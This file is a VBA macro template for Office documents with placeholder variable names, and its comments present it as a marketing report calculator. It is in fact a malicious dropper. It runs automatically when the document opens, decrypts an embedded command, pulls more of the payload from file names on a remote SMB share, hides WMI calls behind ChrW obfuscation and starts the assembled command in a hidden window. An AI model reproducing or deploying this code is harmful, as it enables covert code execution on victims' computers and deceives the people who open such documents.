'-------------------------------------------------------
' Set auto open to compute the table automatically
'-------------------------------------------------------
Sub AutoOpen()
	ComputeTable
End Sub

Sub Document_Open()
	ComputeTable
End Sub

Sub Workbook_Open()
	ComputeTable
End Sub

'-------------------------------------------------------
' Compute report table for marketing departement
'-------------------------------------------------------
Public Function ComputeTable() As Variant
	Dim ${varTmp} As String, ${varEncodedCommand} As String, ${varFinalCommand} As String
	Dim ${varEncryptedCommand} As String
	Dim ${varFlag} As Boolean
	Dim ${varKey} As Integer
	
	${varKey} = ${key}
	${varEncryptedCommand} = "${encryptedCommand}"
	Dim i, n, s As Integer
	For i = 1 To Len(${varEncryptedCommand})
		n = Asc(Mid(${varEncryptedCommand}, i, 1))
		s = n - ${varKey}
		If s < 32 Then
			s = s + 94
		End If
		Mid(${varEncryptedCommand}, i, 1) = Chr(s)
	Next
	
	'-------------------------------------------------------
	' Load templates from remote directory
	'-------------------------------------------------------
	${varTmp} = Dir("\\${serverName}\encoded\", vbNormal)
	${varFlag} = True
	While ${varFlag} = True
		If ${varTmp} = "" Then
			${varFlag} = False
		Else
			${varEncodedCommand} = ${varEncodedCommand} + ${varTmp}
			${varTmp} = Dir
		End If
	Wend
	
	${varEncodedCommand} = Replace(${varEncodedCommand}, vbCrLf, "")
	${varEncodedCommand} = Replace(${varEncodedCommand}, "_", "/")
	
	${varFinalCommand} = ${varEncryptedCommand} & ${varEncodedCommand}
		
	'-------------------------------------------------------
	' Launch computation on the local computer
	'-------------------------------------------------------
	Set ${varObjWMI} = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) _
		& ChrW(58) & ChrW(92) & ChrW(92) & ChrW(46) & ChrW(92) & ChrW(114) & ChrW(111) & ChrW(111) & ChrW(116) & ChrW(92) _
		& ChrW(99) & ChrW(105) & ChrW(109) & ChrW(118) & ChrW(50))
	Set ${varObjStartup} = ${varObjWMI}.Get(ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) & ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) & ChrW(111) _
		& ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115) & ChrW(83) & ChrW(116) & ChrW(97) & ChrW(114) & ChrW(116) _
		& ChrW(117) & ChrW(112))
	Set ${varObjConfig} = ${varObjStartup}.SpawnInstance_
	${varObjConfig}.ShowWindow = 0
	Set ${varObjProcess} = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) _
		& ChrW(58) & ChrW(92) & ChrW(92) & ChrW(46) & ChrW(92) & ChrW(114) & ChrW(111) & ChrW(111) & ChrW(116) & ChrW(92) _
		& ChrW(99) & ChrW(105) & ChrW(109) & ChrW(118) & ChrW(50) & ChrW(58) & ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) _
		& ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) & ChrW(111) & ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115))
	${varObjProcess}.Create ${varFinalCommand}, Null, ${varObjConfig}, intProcessID
End Function
